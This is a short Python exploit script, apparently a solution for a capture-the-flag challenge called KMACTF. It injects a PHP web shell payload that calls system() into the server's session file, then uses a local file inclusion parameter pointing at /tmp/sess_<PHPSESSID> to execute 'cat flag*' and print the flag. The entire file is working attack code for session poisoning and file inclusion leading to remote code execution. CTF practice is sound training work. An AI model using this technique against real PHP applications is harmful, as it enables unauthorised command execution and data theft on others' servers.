import requests
import re

URL = 'http://rce-me.ctf.actvn.edu.vn/'
flag_regex = r'{(.*?)}'
command = 'cat flag*'

def upload_shell():
    print('[+] Uploading shell..')
    params = {'name':f'<?php system("{command}"); ?>'}
    r = requests.get(URL, params=params)
    # print(r.cookies['PHPSESSID'])
    return r.cookies['PHPSESSID']

def getFlag():
    session = upload_shell()
    params = {'l':f'/tmp/sess_{session}'}
    r = requests.get(URL, params=params)
    flag = re.findall(flag_regex, r.text,re.DOTALL)
    print('[+] Flag: KMACTF{%s}' % flag[0])

getFlag()